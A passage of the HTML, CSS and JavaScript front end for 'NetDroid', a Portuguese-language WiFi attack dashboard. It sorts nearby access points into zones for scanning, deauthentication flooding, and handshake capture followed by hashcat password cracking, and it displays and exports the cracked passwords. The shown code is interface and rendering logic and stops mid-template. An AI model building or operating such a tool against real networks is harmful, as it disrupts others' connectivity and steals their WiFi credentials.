  .ap-card.selected { outline: 1px solid var(--yellow); outline-offset: -1px; box-shadow: 0 0 12px rgba(253,238,0,0.25); }

  .pulse-red { animation: pulse-r 1.4s ease-in-out infinite; }
  @keyframes pulse-r { 0%,100%{box-shadow:0 0 6px rgba(255,0,60,0.5)} 50%{box-shadow:0 0 24px rgba(255,0,60,0.95)} }
  .pulse-blue { animation: pulse-b 2s ease-in-out infinite; }
  @keyframes pulse-b { 0%,100%{box-shadow:0 0 6px rgba(0,212,255,0.4)} 50%{box-shadow:0 0 22px rgba(0,212,255,0.85)} }

  @keyframes morph-to-red {
    0%   { background:rgba(0,255,159,0.10); border-color:rgba(0,255,159,0.4); transform:scale(1); }
    25%  { background:rgba(255,200,0,0.16); border-color:rgba(255,160,0,0.6); transform:scale(1.02); }
    60%  { background:rgba(255,80,0,0.20);  border-color:rgba(255,80,0,0.7);  transform:scale(0.99); }
    100% { background:rgba(255,0,60,0.14);  border-color:rgba(255,0,60,0.7);  transform:scale(1); }
  }
  .dying { animation: morph-to-red 3s ease-out forwards; }

  @keyframes morph-to-blue {
    0%   { background:rgba(0,255,159,0.10); }
    100% { background:rgba(0,212,255,0.12); }
  }
  .crystallizing { animation: morph-to-blue 1.5s ease-out forwards; }

  /* F4: animação de VITÓRIA quando senha é quebrada */
  @keyframes morph-to-green {
    0%   { background:rgba(0,212,255,0.10); border-color:rgba(0,212,255,0.4); }
    25%  { background:rgba(180,255,200,0.30); border-color:rgba(0,255,159,0.9); transform:scale(1.04); }
    60%  { background:rgba(120,255,180,0.22); border-color:rgba(0,255,159,0.95); transform:scale(0.99); }
    100% { background:rgba(0,255,159,0.18); border-color:rgba(0,255,159,0.7); transform:scale(1); }
  }
  @keyframes glow-victory {
    0%,100% { box-shadow: 0 0 8px rgba(0,255,159,0.5); }
    50%     { box-shadow: 0 0 32px rgba(0,255,159,1.0), 0 0 64px rgba(0,255,159,0.5); }
  }
  .cracked-victory {
    animation: morph-to-green 2s ease-out forwards,
               glow-victory 0.7s ease-in-out 3 1.8s;
    border-width: 1px !important;
  }
  .cracked-stable {
    background: rgba(0,255,159,0.10) !important;
    border: 1px solid rgba(0,255,159,0.7) !important;
    box-shadow: 0 0 14px rgba(0,255,159,0.3);
  }
  .cracked-banner {
    background: linear-gradient(180deg, rgba(0,255,159,0.15), rgba(0,255,159,0.05));
    border: 1px solid rgba(0,255,159,0.55);
    box-shadow: inset 0 0 20px rgba(0,255,159,0.1);
  }

  .fadein { animation: fadein .35s ease-out; }
  @keyframes fadein { from{opacity:0;transform:translateY(6px)} to{opacity:1;transform:translateY(0)} }
  .blink { animation: blink 1s steps(2) infinite; }
  @keyframes blink { 50%{opacity:0.3} }

  /* LEDs */
  .led { display:inline-block; width:6px; height:6px; border-radius:50%; margin-right:6px; vertical-align:middle; }
  .led-on  { background:var(--green); box-shadow: 0 0 6px var(--green); }
  .led-warn{ background:var(--yellow); box-shadow: 0 0 6px var(--yellow); }
  .led-off { background:var(--red);   box-shadow: 0 0 8px var(--red); animation: led-blink 1.4s ease-in-out infinite; }
  @keyframes led-blink { 50% { opacity: 0.3; } }

  /* Section header */
  h2.sec {
    font-size:0.7rem; letter-spacing:0.22em; text-transform:uppercase;
    color:var(--text); font-weight:700;
    display:flex; align-items:center; gap:10px;
  }
  h2.sec::before { content:''; width:14px; height:1px; background:var(--red); }

  /* Stat */
  .stat { padding: 18px 16px 14px; position: relative; overflow:hidden; }
  .stat::after { content:''; position:absolute; bottom:0; left:0; height:1px; width:40%; background: linear-gradient(90deg, var(--red), transparent); }
  .stat-val { font-family:'Orbitron',monospace; font-size:1.9rem; font-weight:800; line-height:1; letter-spacing:-0.01em; font-variant-numeric: tabular-nums; }
  .stat-lbl { font-size:0.62rem; letter-spacing:0.22em; text-transform:uppercase; color:var(--text-dim); margin-top:10px; }

  /* Pills */
  .pill {
    display:inline-flex; align-items:center; gap:4px;
    font-size:0.62rem; letter-spacing:0.08em; font-weight:600;
    padding:2px 8px; border-radius:3px; border:1px solid currentColor;
    text-transform:uppercase;
  }
  .sev-critica { background:rgba(255,0,60,0.12); color:#ff5d77; border-color:rgba(255,0,60,0.4); }
  .sev-alta    { background:rgba(255,140,0,0.12); color:#ff9d4d; border-color:rgba(255,140,0,0.4); }
  .sev-media   { background:rgba(255,220,0,0.10); color:#ffe05e; border-color:rgba(255,220,0,0.35); }
  .sev-info    { background:rgba(0,212,255,0.10); color:#5fbcff; border-color:rgba(0,212,255,0.35); }
  .sev-ok      { background:rgba(0,255,159,0.10); color:#5fff9f; border-color:rgba(0,255,159,0.35); }
  /* Compatibilidade com badge-sev-* (legado) */
  .badge-sev-critica { background:rgba(255,0,60,0.12); color:#ff5d77; border:1px solid rgba(255,0,60,0.4); }
  .badge-sev-alta    { background:rgba(255,140,0,0.12); color:#ff9d4d; border:1px solid rgba(255,140,0,0.4); }
  .badge-sev-media   { background:rgba(255,220,0,0.10); color:#ffe05e; border:1px solid rgba(255,220,0,0.35); }
  .badge-sev-info    { background:rgba(0,212,255,0.10); color:#5fbcff; border:1px solid rgba(0,212,255,0.35); }

  /* Progress bar */
  .progress-bar { background:linear-gradient(90deg,var(--cyan),var(--purple)); height:5px; transition: width .4s ease; }

  /* Botões zona */
  .btn-zone {
    font-size:0.6rem; letter-spacing:0.14em; padding:4px 10px; border-radius:4px;
    text-transform:uppercase; font-weight:700; cursor:pointer; transition: all .2s;
  }
  .btn-zone:hover { transform: translateY(-1px); }
  .btn-red   { background: rgba(255,0,60,0.10); border:1px solid rgba(255,0,60,0.35); color:#ff7090; }
  .btn-red:hover   { background: rgba(255,0,60,0.22); box-shadow: 0 0 12px rgba(255,0,60,0.4); }
  .btn-blue  { background: rgba(0,212,255,0.10); border:1px solid rgba(0,212,255,0.35); color:#5fbcff; }
  .btn-blue:hover  { background: rgba(0,212,255,0.22); box-shadow: 0 0 12px rgba(0,212,255,0.4); }
  .btn-green { background: rgba(0,255,159,0.10); border:1px solid rgba(0,255,159,0.35); color:#5fff9f; }
  .btn-green:hover { background: rgba(0,255,159,0.22); box-shadow: 0 0 12px rgba(0,255,159,0.4); }
  /* F3: botão Exportar (cor distinta dos botões de movimento) */
  .btn-export { background: rgba(188,19,254,0.10); border:1px solid rgba(188,19,254,0.4); color:#d4a5ff; }
  .btn-export:hover { background: rgba(188,19,254,0.25); box-shadow: 0 0 12px rgba(188,19,254,0.5); color:#fff; }

  /* Scrollbar */
  ::-webkit-scrollbar { width:6px; height:6px; }
  ::-webkit-scrollbar-track { background: transparent; }
  ::-webkit-scrollbar-thumb { background: rgba(255,0,60,0.25); border-radius:3px; }
  ::-webkit-scrollbar-thumb:hover { background: rgba(255,0,60,0.5); }

  /* Scroll independente nas zonas */
  .zone-scroll {
    max-height: calc(100vh - 280px);
    overflow-y: auto;
    overflow-x: hidden;
    scrollbar-width: thin;
    padding-right: 4px;
  }
  .zone-scroll::-webkit-scrollbar { width: 5px; }
  .zone-scroll::-webkit-scrollbar-track { background: rgba(0,0,0,0.3); border-radius: 3px; }
  .zone-scroll::-webkit-scrollbar-thumb { background: rgba(255,0,60,0.3); border-radius: 3px; }
  .zone-scroll::-webkit-scrollbar-thumb:hover { background: rgba(255,0,60,0.6); }

  /* Botão de reset minimalista */
  .btn-reset {
    font-size: 0.7rem;
    padding: 2px 6px;
    border-radius: 3px;
    background: rgba(255,255,255,0.1);
    border: 1px solid rgba(255,255,255,0.2);
    color: #aaa;
    cursor: pointer;
    transition: all 0.2s;
    margin-left: 4px;
  }
  .btn-reset:hover {
    background: rgba(255,255,255,0.2);
    color: #fff;
    transform: rotate(180deg);
  }
  .btn-reset.red:hover { border-color: var(--red); color: var(--red); }
  .btn-reset.blue:hover { border-color: var(--cyan); color: var(--cyan); }

  /* Multi-select wordlist */
  .wordlist-checkbox {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 6px 8px;
    border-radius: 4px;
    cursor: pointer;
    transition: background 0.2s;
  }
  .wordlist-checkbox:hover { background: rgba(0,212,255,0.1); }
  .wordlist-checkbox input[type="checkbox"] { accent-color: var(--cyan); }
  .wordlist-selected {
    background: rgba(0,212,255,0.15) !important;
    border: 1px solid rgba(0,212,255,0.4);
  }
  .wordlist-queue {
    display: flex;
    flex-wrap: wrap;
    gap: 4px;
    margin-top: 8px;
    padding: 8px;
    background: rgba(0,0,0,0.3);
    border-radius: 4px;
    min-height: 32px;
  }
  .wordlist-queue-item {
    font-size: 0.65rem;
    padding: 2px 8px;
    border-radius: 12px;
    background: rgba(0,212,255,0.2);
    border: 1px solid rgba(0,212,255,0.4);
    color: var(--cyan);
    display: flex;
    align-items: center;
    gap: 4px;
  }
  .wordlist-queue-item .remove {
    cursor: pointer;
    opacity: 0.6;
  }
  .wordlist-queue-item .remove:hover { opacity: 1; color: var(--red); }
</style>
</head>
<body>

<header class="cyber border-0 border-b px-4 md:px-6 py-3 flex flex-wrap items-center justify-between gap-2 sticky top-0 z-30" style="background: rgba(5,6,8,0.92); border-color: var(--line-hot)" role="banner">
  <div class="flex items-center gap-3 md:gap-5">
    <div class="logo">NETDROID</div>
    <div class="tag-mode">⚡ KAMIKASE · C2 LIVE</div>
    <div class="hidden md:block text-xs text-gray-500" id="timestamp">--:--:--</div>
  </div>
  <div class="flex flex-wrap items-center gap-2 md:gap-3 text-xs">
    <span class="flex items-center text-gray-500" title="Status do scanner">
      <span id="led-status" class="led led-on" aria-hidden="true"></span>
      <span class="hidden md:inline uppercase tracking-wider text-gray-400">online</span>
    </span>
    <span class="text-gray-500">Pkts: <span id="stat-pkts" class="text-red-400 font-bold">0</span></span>
    <span class="text-gray-500">PPS: <span id="stat-pps" class="text-yellow-400 font-bold">0</span></span>
    <span class="hidden sm:inline text-gray-500">Sel: <span id="stat-sel" class="text-yellow-400 font-bold">0</span></span>
    <span class="px-2 py-0.5 rounded bg-purple-950/40 border border-purple-700 text-purple-300" title="Memória persistente local (./memoria/db.json + ./Pass/senhas.txt)">
      💾 <span id="mem-aps">0</span>·<span id="mem-hs">0</span>·<span id="mem-pwd" class="text-green-400 font-bold">0</span>
    </span>
    <span class="hidden md:inline text-gray-500">v1.5.0</span>
    <button onclick="pararTudo()" class="btn-zone btn-red ml-2" style="border: 1px solid var(--red); box-shadow: 0 0 8px rgba(255,0,60,0.5);" aria-label="Parar todos os ataques e mover APs para zona verde">🛑 PARAR TUDO</button>
  </div>
</header>

<!-- Toolbar de seleção (aparece quando há cards selecionados) -->
<div id="bulk-toolbar" class="hidden glass border-b border-yellow-900/40 px-6 py-2 flex items-center gap-3 sticky top-[57px] z-20">
  <span class="text-yellow-400 text-sm font-bold">⚡ Ação em massa nos selecionados:</span>
  <button onclick="moverSelecionados('verde')" class="btn-zone btn-green">→ VERDE (parar ataque)</button>
  <button onclick="moverSelecionados('vermelha')" class="btn-zone btn-red">→ VERMELHA (deauth)</button>
  <button onclick="moverSelecionados('azul')" class="btn-zone btn-blue">→ AZUL (crack)</button>
  <button onclick="limparSelecao()" class="btn-zone bg-gray-800 text-gray-400">Limpar</button>
</div>

<main class="p-4 grid grid-cols-12 gap-4">

  <section class="col-span-12 grid grid-cols-2 md:grid-cols-4 gap-3">
    <div class="cyber stat zone-green"><div class="stat-val" style="color:var(--green)" id="cnt-verde">0</div><div class="stat-lbl">▸ APs Saudáveis</div></div>
    <div class="cyber stat zone-red"><div class="stat-val" style="color:var(--red)" id="cnt-vermelha">0</div><div class="stat-lbl">▸ Sob Deauth</div></div>
    <div class="cyber stat zone-blue"><div class="stat-val" style="color:var(--cyan)" id="cnt-azul">0</div><div class="stat-lbl">▸ Crack Queue</div></div>
    <div class="cyber p-4 flex items-center justify-center"><canvas id="chart-zonas" height="80"></canvas></div>
  </section>

  <!-- ZONA VERDE -->
  <section class="col-span-12 md:col-span-6 lg:col-span-4 glass rounded-lg p-4 zone-green">
    <div class="flex items-center justify-between mb-2">
      <h2 class="sec" style="color:var(--green)">🟢 Verde · Saudáveis</h2>
      <div class="flex gap-1">
        <button id="btn-mapear" onclick="toggleMapearContinuo()" class="btn-zone btn-green font-bold" title="Iniciar/Parar scan contínuo">
          🔄 Mapear Contínuo
        </button>
        <button id="btn-cadeado" onclick="toggleCadeado()" class="btn-zone btn-green" title="Trava/destrava todas as varreduras">
          🔓 Cadeado
        </button>
        <button id="btn-nmcli" onclick="scanNmcli()" class="btn-zone btn-green" title="Extrai TODAS as redes via nmcli (sem duplicar)">
          📡 NMCLI
        </button>
        <button id="btn-scapy" onclick="scanScapy()" class="btn-zone btn-green" title="Captura passiva via scapy (sniff 802.11)">
          🦂 Scapy
        </button>
      </div>
    </div>
    <div class="flex gap-1 mb-3 flex-wrap">
      <button onclick="moverTodos('verde','vermelha')" class="btn-zone btn-red" aria-label="Mover todos da zona verde para vermelha">→ todos vermelha</button>
      <button onclick="moverTodos('verde','azul')" class="btn-zone btn-blue" aria-label="Mover todos da zona verde para azul">→ todos azul</button>
      <button onclick="selecionarTodos('verde')" class="btn-zone bg-gray-800 text-yellow-400" aria-label="Selecionar todos os APs da zona verde">selecionar tudo</button>
      <button onclick="exportarZona('verde')" class="btn-zone btn-export" aria-label="Exportar APs da zona verde para PDF e TXT">📤 exportar</button>
    </div>
    <div id="z-verde" class="space-y-2 min-h-[200px] zone-scroll"></div>
  </section>

  <!-- ZONA VERMELHA -->
  <section class="col-span-12 md:col-span-6 lg:col-span-4 glass rounded-lg p-4 zone-red">
    <div class="flex items-center justify-between mb-2 flex-wrap gap-2">
      <h2 class="sec" style="color:var(--red)">🔴 Vermelha · Sob Deauth</h2>
      <div class="flex items-center gap-2">
        <label class="text-[0.65rem] text-gray-500 uppercase tracking-wider">slot:</label>
        <select id="slot-vermelha-sel" onchange="setSlotVermelha(this.value)"
                class="bg-gray-900 border border-red-700/50 text-red-300 text-xs rounded px-2 py-1"
                aria-label="Duração do slot do carrossel vermelha">
          <option value="15" selected>15s (padrão)</option>
          <option value="60">1 min</option>
          <option value="300">5 min</option>
          <option value="3600">1 hora</option>
          <option value="infinito">∞ Infinito (1 canal)</option>
        </select>
      </div>
    </div>
    <div class="flex gap-1 mb-3 flex-wrap">
      <button onclick="moverTodos('vermelha','verde')" class="btn-zone btn-green" aria-label="Parar deauth de todos os APs">← todos verde</button>
      <button onclick="moverTodos('vermelha','azul')" class="btn-zone btn-blue" aria-label="Mover todos para crack">→ todos azul</button>
      <button onclick="selecionarTodos('vermelha')" class="btn-zone bg-gray-800 text-yellow-400" aria-label="Selecionar todos os APs da zona vermelha">selecionar tudo</button>
    </div>
    <div id="z-vermelha" class="space-y-2 min-h-[200px] zone-scroll"></div>
  </section>

  <!-- ZONA AZUL -->
  <section class="col-span-12 md:col-span-6 lg:col-span-4 glass rounded-lg p-4 zone-blue">
    <div class="flex items-center justify-between mb-2 flex-wrap gap-2">
      <h2 class="sec" style="color:var(--cyan)">🔵 Azul · Crack Hashcat</h2>
      <div class="flex items-center gap-2">
        <label class="text-[0.65rem] text-gray-500 uppercase tracking-wider">slot:</label>
        <select id="slot-azul-sel" onchange="setSlotAzul(this.value)"
                class="bg-gray-900 border border-cyan-700/50 text-cyan-300 text-xs rounded px-2 py-1"
                aria-label="Duração do slot do carrossel azul">
          <option value="10" selected>10s (padrão)</option>
          <option value="30">30s</option>
          <option value="60">1 min</option>
          <option value="300">5 min</option>
          <option value="infinito">∞ Infinito (1 canal)</option>
        </select>
      </div>
    </div>
    <div class="flex gap-1 mb-3 flex-wrap">
      <button onclick="moverTodos('azul','verde')" class="btn-zone btn-green" aria-label="Mover todos para verde">← todos verde</button>
      <button onclick="moverTodos('azul','vermelha')" class="btn-zone btn-red" aria-label="Mover todos para deauth">→ todos vermelha</button>
      <button onclick="selecionarTodos('azul')" class="btn-zone bg-gray-800 text-yellow-400" aria-label="Selecionar todos da zona azul">selecionar tudo</button>
      <button onclick="exportarZona('azul')" class="btn-zone btn-export" aria-label="Exportar APs da zona azul (com senhas) para PDF e TXT">📤 exportar</button>
      <button onclick="restaurarWifi()" id="btn-restaurar-wifi" class="btn-zone" style="background:rgba(0,212,255,0.15); border:1px solid var(--cyan); color:var(--cyan);" aria-label="Restaurar WiFi (sair do monitor mode)">📶 Restaurar WiFi</button>
    </div>
    <div id="z-azul" class="space-y-2 min-h-[200px] zone-scroll"></div>
  </section>

  <!-- WORDLISTS DISPONÍVEIS -->
  <section class="col-span-12 lg:col-span-4 glass rounded-lg p-4">
    <h2 class="sec mb-3" style="color:var(--purple)">📚 Wordlists Disponíveis</h2>
    <div id="wordlist-list" class="space-y-1 max-h-[300px] overflow-y-auto text-xs"></div>
    <p class="text-xs text-gray-500 mt-3">Coloque arquivos <code>.txt</code> em <code>./WordList/</code> · NetDroid prepende 500-1000 variações contextuais (nome do WiFi + sufixos numéricos + anos + leet speak) <strong>antes</strong> da wordlist escolhida.</p>
  </section>

  <!-- LOG -->
  <section class="col-span-12 lg:col-span-8 glass rounded-lg p-4">
    <h2 class="sec mb-3">▸ Log em Tempo Real</h2>
    <pre id="logfeed" class="text-xs leading-5 max-h-[300px] overflow-y-auto text-gray-400"></pre>
  </section>

</main>

<!-- Modal de DETALHES PROFUNDOS do AP -->
<div id="modal-detalhes" class="hidden fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-2 md:p-4" role="dialog" aria-modal="true" aria-labelledby="det-essid">
  <div class="cyber rounded-lg p-4 md:p-6 w-full max-w-full md:max-w-3xl max-h-[95vh] md:max-h-[90vh] overflow-y-auto" style="border: 1px solid var(--purple); box-shadow: 0 0 40px rgba(188,19,254,0.3);">
    <div class="flex items-start justify-between mb-4">
      <div class="min-w-0">
        <h3 class="text-xl md:text-2xl font-black truncate" style="color:var(--purple)" id="det-essid">?</h3>
        <p class="text-xs text-gray-500 mt-1 break-all" id="det-bssid">?</p>
      </div>
      <button onclick="fecharDetalhes()" class="text-gray-400 hover:text-white text-2xl leading-none px-2" aria-label="Fechar detalhes">×</button>
    </div>
    <div id="det-body" class="space-y-4 text-sm"></div>
    <div class="flex gap-2 mt-6 pt-4 border-t border-purple-900/40">
      <button onclick="fecharDetalhes()" class="px-4 py-2 rounded glass" aria-label="Fechar modal">Fechar</button>
    </div>
  </div>
</div>

<!-- Modal de configuração crack -->
<div id="modal" class="hidden fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-2 md:p-4" role="dialog" aria-modal="true" aria-labelledby="modal-bssid">
  <div class="cyber rounded-lg p-4 md:p-6 w-full max-w-full md:max-w-xl zone-blue" style="max-height: 95vh; overflow-y: auto;">
    <h3 class="text-base md:text-lg font-bold mb-4" style="color:var(--cyan)">🔓 Configurar Crack — <span id="modal-bssid">?</span></h3>
    <p class="text-xs text-gray-400 mb-3" id="modal-essid">ESSID: ?</p>
    <div class="space-y-3 text-sm">
      <div><label class="text-gray-400">Perfil hashcat (intensidade GPU):</label>
        <select id="modal-perfil" class="w-full mt-1 bg-black border border-cyan-900 rounded px-2 py-1 text-white"></select></div>

      <div><label class="text-gray-400">Selecione as wordlists (serão usadas em sequência até quebrar):</label>
        <div id="modal-wordlist-list" class="mt-2 max-h-[200px] overflow-y-auto space-y-1 border border-cyan-900/30 rounded p-2"></div>
      </div>

      <div><label class="text-gray-400">Fila de wordlists selecionadas (ordem de execução):</label>
        <div id="wordlist-queue" class="wordlist-queue">
          <span class="text-gray-500 text-xs italic">Nenhuma wordlist selecionada</span>
        </div>
      </div>

      <div class="flex items-center gap-2">
        <input type="checkbox" id="modal-contextual" checked class="accent-cyan-500">
        <label for="modal-contextual" class="text-gray-400">Prepend 1000 variações contextuais do ESSID na primeira wordlist (recomendado)</label>
      </div>
      <div class="flex items-center gap-2">
        <input type="checkbox" id="modal-stop-on-crack" checked class="accent-cyan-500">
        <label for="modal-stop-on-crack" class="text-gray-400">Parar quando senha for encontrada</label>
      </div>
    </div>
    <div class="flex gap-2 mt-5">
      <button onclick="confirmarCrack()" class="flex-1 bg-cyan-700 hover:bg-cyan-600 px-3 py-2 rounded text-white font-bold">Iniciar Crack</button>
      <button onclick="clearWordlistSelection(); fecharModal();" class="px-3 py-2 rounded glass">Cancelar</button>
    </div>
  </div>
</div>

<footer class="text-center text-xs text-gray-600 py-4 border-t border-red-900/30 mt-4">
  NetDroid v1.4.0 · KAMIKASE C2 Live · Localhost only · Uso autorizado apenas
</footer>

<script>
const sock = io({transports:["polling"]});
let aps = {};
let zonas = {verde:[], vermelha:[], azul:[]};
let selecionados = new Set();
let chartZonas;
let modalContext = null; // {bssids:[], destinoVoltar:'verde'}
let zonasRecemDying = new Set();    // bssids que estão na animação morph-to-red
let zonasRecemBlue = new Set();     // bssids que estão na animação morph-to-blue
let zonasRecemCracked = new Set();  // F4: bssids recém-quebrados (animação 4s morph-to-green)

function tag(text, classes){return `<span class="inline-block px-2 py-0.5 rounded text-xs ${classes}">${text}</span>`}
function sevColor(s){return {ok:"bg-green-900 text-green-300",info:"bg-blue-900 text-blue-300",media:"bg-yellow-900 text-yellow-300",alta:"bg-orange-900 text-orange-300",critica:"bg-red-900 text-red-300"}[s]||"bg-gray-800 text-gray-400"}
function freqResumo(ap){
  const mhz = ap.freq_mhz && ap.freq_mhz !== "?" ? `${ap.freq_mhz} MHz` : "? MHz";
  const banda = ap.band_ghz && ap.band_ghz !== "?" ? ap.band_ghz : "?";
  const nivel = ap.band_label && ap.band_label !== "?" ? ap.band_label : "?";
  return `${mhz} · ${banda} · ${nivel}`;
}
function sinalResumo(ap){
  const rssi = ap.rssi_dbm ?? ap.rssi ?? "?";
  const nivel = ap.signal_label && ap.signal_label !== "?" ? ap.signal_label : "?";
  const pct = ap.signal_percent && ap.signal_percent !== "?" ? ` · ${ap.signal_percent}%` : "";
  return `${rssi} dBm · ${nivel}${pct}`;
}
function statusCrackLabel(status){
  return {
    capture_queued:"aguardando captura",
    capturing:"capturando handshake",
    queued:"na fila hashcat",
    preparing:"preparando hash",
    running:"rodando hashcat",
    cracked:"senha encontrada",
    exhausted:"wordlists esgotadas",
    cancelled:"cancelado",
    capture_failed:"falha na captura",
    convert_failed:"falha na conversao",
    hashcat_missing:"hashcat ausente",
    wordlist_missing:"wordlist ausente",
    error:"erro"
  }[status] || status || "queued";
}

function cardHTML(ap, zona){
  // B6: senha pode vir do crack (sessão atual) OU da memória (sessão anterior)
  const sec = ap.security || ap.crypto || "?";
  const secBadge = sec !== "?" ? `<span class="text-xs px-2 py-0.5 rounded bg-gray-800 text-gray-300 border border-gray-600">${sec}</span>` : `<span class="text-xs text-gray-500">?</span>`;
  const wps = ap.wps_enabled ? `<span class="text-red-400 text-xs font-bold ml-1">WPS</span>` : "";
  const score = ap.score ?? 100;
  const pkts = ap.pacotes || 0;
  const prog = ap.crack && ap.crack.progresso ? ap.crack.progresso : 0;
  const wlProg = ap.crack && ap.crack.wordlist_progress ? ap.crack.wordlist_progress : 0;
  const wlAtual = ap.crack && ap.crack.wordlist_atual ? ap.crack.wordlist_atual : "";
  const wlIndex = ap.crack && Number.isInteger(ap.crack.wordlist_index) ? ap.crack.wordlist_index + 1 : 0;
  const wlTotal = ap.crack && ap.crack.wordlist_total ? ap.crack.wordlist_total : 0;
  const status = ap.crack && ap.crack.status ? ap.crack.status : "";
  // Senha vem de crack.senha (sessão atual) OU ap.senha (memória persistente)
  const senha = (ap.crack && ap.crack.senha) ? ap.crack.senha : (ap.senha || null);
  const wlQuebrou = (ap.crack && ap.crack.wordlist_quebrou) || ap.wordlist_usada || "";
  const eta = ap.crack && ap.crack.eta ? ap.crack.eta : "?";
  const ctxCount = ap.crack && ap.crack.contextual_count ? ap.crack.contextual_count : 0;
  const isSelected = selecionados.has(ap.bssid);
  // F4: classes de animação por estado
  const recemQuebrado = (typeof zonasRecemCracked !== "undefined") && zonasRecemCracked.has(ap.bssid);
  const monitorAviso = ap.monitor_failed || (ap.monitor_aviso && zona === "vermelha");

  let extra = "";
  if(zona==="vermelha") {
    extra = `<div class="text-xs text-red-400 mt-2 font-bold blink flex items-center justify-between">
      <span>⚡ ${pkts.toLocaleString()} pkts deauth</span>
      <button class="btn-reset red" onclick="event.stopPropagation(); resetDeauth('${ap.bssid}')" title="Reiniciar deauth" aria-label="Reiniciar deauth para ${ap.bssid}">↻</button>
    </div>${monitorAviso?`<div class="text-xs text-yellow-400 mt-1 bg-yellow-950/30 px-2 py-1 rounded border border-yellow-800">⚠ ${ap.monitor_aviso || "Monitor mode ausente — deauth pode não chegar ao ar"}</div>`:""}`;
  } else if(zona==="azul") {
    const podeResetar = ["done","failed","exhausted","error","capture_failed","convert_failed","hashcat_missing","wordlist_missing","cancelled"].includes(status);
    // F5: senha em destaque GRANDE quando quebrada
    const senhaBlock = senha ? `
      <div class="cracked-banner mt-3 text-center p-2 rounded">
        <div class="text-[0.62rem] uppercase tracking-[0.2em] text-green-300 font-bold">🔓 senha quebrada</div>
        <code class="block text-2xl font-black text-green-200 mt-1 break-all" style="text-shadow:0 0 8px rgba(0,255,159,0.6);font-family:'JetBrains Mono',monospace">${senha}</code>
        ${wlQuebrou?`<div class="text-[0.65rem] text-gray-400 mt-1">via <code class="text-purple-300">${wlQuebrou}</code></div>`:""}
      </div>` : "";
    // Se senha vem só da memória, mostra label "memória" e não barra de progresso
    if(senha && !status){
      extra = senhaBlock + `<div class="text-[0.65rem] text-gray-500 mt-1 italic">restaurado da memória persistente</div>`;
    } else {
      // Contador grande de tentativas + tempo acumulado durante captura
      const tentativa = (ap.crack && ap.crack.tentativa) ? ap.crack.tentativa : (ap.carrossel_ciclos || 0);
      const tempoAcumulado = (ap.crack && ap.crack.tempo_acumulado_s) ? ap.crack.tempo_acumulado_s : (ap.carrossel_tempo_acumulado_s || 0);
      const tempoLabel = tempoAcumulado >= 60 ? `${Math.floor(tempoAcumulado/60)}min ${tempoAcumulado%60}s` : `${tempoAcumulado}s`;
      const burstCount = ap.azul_burst_count || 0;
      const azulFase = ap.azul_fase || "";  // "burst" ou "escutando"
      const faseIcon = azulFase === "burst" ? "💥" : (azulFase === "escutando" ? "👂" : "🎯");
      const faseTexto = azulFase === "burst"
        ? `disparando burst (kick clientes)`
        : (azulFase === "escutando"
            ? `🔊 escutando reconexão (cliente vai mandar EAPOL)`
            : "preparando…");
      const blocoTentativas = (status === "capturing" && tentativa > 0) ? `
        <div class="text-center mt-2 p-2 rounded border border-cyan-700/50 bg-cyan-950/30">
          <div class="text-[0.62rem] uppercase tracking-[0.2em] text-cyan-300 font-bold">${faseIcon} capturando handshake</div>
          <div class="text-3xl font-black text-cyan-200 leading-tight" style="text-shadow:0 0 10px rgba(0,212,255,0.7);font-family:'JetBrains Mono',monospace">ciclo #${tentativa}</div>
          <div class="text-[0.7rem] text-cyan-400 mt-1">⏱ ${tempoLabel} acumulados · 💥 ${burstCount} bursts</div>
          <div class="text-[0.65rem] text-gray-400 italic mt-0.5">${faseTexto}</div>
        </div>` : ((status === "queued_carrossel") ? `
        <div class="text-center mt-2 p-2 rounded border border-cyan-700/30 bg-cyan-950/20">
          <div class="text-[0.62rem] uppercase tracking-[0.2em] text-cyan-300 font-bold">⏳ aguardando slot</div>
          <div class="text-[0.7rem] text-gray-400 italic">próximo ciclo do carrossel</div>
        </div>` : "");
      extra = `
        <div class="text-xs mt-2 flex items-center justify-between">
          <span class="text-cyan-400 font-bold">${statusCrackLabel(status)}</span>
          <span class="text-gray-400">${prog.toFixed(1)}% · ETA ${eta}</span>
        </div>
        <div class="bg-gray-900 h-1.5 rounded mt-1 overflow-hidden"><div class="progress-bar" style="width:${prog}%"></div></div>
        ${blocoTentativas}
        ${wlAtual?`<div class="text-xs text-gray-400 mt-1">WL ${wlIndex}/${wlTotal}: <code>${wlAtual}</code> · ${wlProg.toFixed(1)}%</div>`:""}
        ${ap.crack&&ap.crack.erro?`<div class="text-xs text-red-400 mt-1">${ap.crack.erro}</div>`:""}
        ${ctxCount?`<div class="text-xs text-purple-400 mt-1">📚 ${ctxCount} variações contextuais prepended</div>`:""}
        ${senhaBlock}
        <div class="mt-2 flex items-center gap-2 flex-wrap">
          <button class="btn-reset blue text-xs" onclick="event.stopPropagation(); recapturarHandshake('${ap.bssid}')" title="Cancela captura atual e tenta de novo do zero" aria-label="Recapturar handshake para ${ap.bssid}">🔄 recapturar handshake</button>
          ${podeResetar?`<button class="btn-reset blue text-xs" onclick="event.stopPropagation(); abrirModalParaLote(['${ap.bssid}'], 'azul')" title="Configurar wordlists e reiniciar captura/crack" aria-label="Configurar crack">⚙ configurar</button>`:""}
        </div>
      `;
    }
  }
  // Classes de animação
  const dyingClass = (zona==="vermelha" && zonasRecemDying.has(ap.bssid)) ? "dying" : "";
  const crystClass = (zona==="azul" && zonasRecemBlue.has(ap.bssid)) ? "crystallizing" : "";
  // F4: cracked-victory (animação 2s) → cracked-stable (estado permanente)
  const victoryClass = (zona==="azul" && recemQuebrado) ? "cracked-victory" : "";
  const stableClass = (zona==="azul" && senha && !recemQuebrado) ? "cracked-stable" : "";
  const pulseClass = (zona==="vermelha" && !zonasRecemDying.has(ap.bssid)) ? "pulse-red" :
                     (zona==="azul" && !zonasRecemBlue.has(ap.bssid) && !senha) ? "pulse-blue" : "";
  // Indicadores visuais de persistência
  const memBadges = [];
  if(senha) memBadges.push(`<span class="text-green-400 text-xs" title="Senha quebrada">🔓</span>`);
  if(ap.handshake_path) memBadges.push(`<span class="text-cyan-400 text-xs" title="Handshake capturado">📦</span>`);
  if(ap.visitas && ap.visitas > 1) memBadges.push(`<span class="text-purple-400 text-xs" title="Visto ${ap.visitas} vezes">👁 ${ap.visitas}</span>`);
  return `
    <div class="ap-card glass rounded p-3 fadein ${pulseClass} ${dyingClass} ${crystClass} ${victoryClass} ${stableClass} ${isSelected?"selected":""}" data-bssid="${ap.bssid}" onclick="abrirDetalhes('${ap.bssid}')">
